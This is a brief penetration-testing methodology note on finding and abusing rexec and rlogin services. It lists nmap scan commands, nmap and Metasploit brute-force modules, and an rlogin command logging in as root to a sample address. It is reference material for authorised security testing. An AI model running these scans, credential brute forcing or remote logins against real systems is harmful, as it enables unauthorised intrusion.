# REXEC / RLOGIN - Methodology

The rexec and rlogin services are design to allow users of a network to execute
commands remotely.  
However, those services do not provide any good means of authentication, so
they may be abused to leverage an unauthenticated RCE.

### Network scan

Nmap can be used to scan the network for open rexec and rlogin services:

```
nmap -v -p 512,513 -A <RANGE/CIDR>
```

### Auth bruteforce

The nmap NSE scripts rexec-brute.nse and rlogin-brute.nse can be used to brute
force the services, as well as the metasploit modules
auxiliary/scanner/rservices/rexec_login and
auxiliary/scanner/rservices/rlogin_login.  
If all tested credentials are returned as valid ("Valid
credentials"), the services are vulnerable to unauthenticated access.

```
nmap -v -p 512 --script rexec-brute.nse <TARGET>
nmap -v -p 513 --script rlogin-brute.nse <TARGET>

msf > use auxiliary/scanner/rservices/rexec_login
msf > use auxiliary/scanner/rservices/rlogin_login
```

### CLI access

The rlogin CLI tool can be used to access a system:

```
rlogin [-8ELKd] [-e char] [-i user] [-l user] [-p port] host

rlogin -i root 172.26.124.34
```